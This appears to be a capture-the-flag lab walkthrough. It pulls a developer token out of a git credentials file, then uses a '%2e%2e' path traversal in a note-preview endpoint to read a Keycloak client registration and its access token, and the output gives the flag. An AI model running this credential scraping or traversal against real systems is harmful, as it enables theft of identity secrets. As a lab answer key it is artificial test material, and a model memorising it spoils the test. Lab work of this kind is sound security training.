# K18.2 Walkthrough: A note with someone else's authority

```
gcloud compute ssh cinder-qa-b-keplerops --project prod-mgau4w --zone us-central1-a --tunnel-through-iap
sudo docker exec -it --user rowan cinder-keplerops-k-dev bash
```

## Read the developer token

```
TOKEN=$(sed -E 's#https://[^:]+:([^@]+)@.*#\1#' ~/.config/git/credentials)
CA=~/.local/share/keplerops/ca.crt
```

## Get the support registration id (K18.1)

```
curl -sS --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://staff.keplerops.test/api/service-directory
```

Output includes `"support_registration":"OIDC-FIELDKEST-SUPPORT"`.

## Find the identity registration route

The staff client reference (`identity.registration` route) names the real
registration endpoint on the identity service (Keycloak dynamic client
registration):

`https://identity.keplerops.test/realms/keplerops/clients-registrations/openid-connect/{registration_id}`

## Read the registration through the note-preview path traversal (K18.2 acceptance check)

The note-preview endpoint requires `source_path` to start with `/notes/`, then
decodes `%2e%2e` and resolves the first segment to a service host. Point the
traversal at the identity registration route.

```
curl -sS --cacert $CA -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary '{"source_path":"/notes/%2e%2e/identity/realms/keplerops/clients-registrations/openid-connect/OIDC-FIELDKEST-SUPPORT","method":"GET"}' \
  https://staff.keplerops.test/api/note-preview
```

Output:

```json
{"flag":"FLAG{8978e5b290f6d320}","registration_id":"OIDC-FIELDKEST-SUPPORT","client_id":"OIDC-FIELDKEST-SUPPORT","registration_access_token":"...","redirect_uris":[...]}
```

Gate: a `source_path` that does not start with `/notes/` is rejected
(`invalid_source_path`); a path that resolves outside a known service returns
an upstream error.
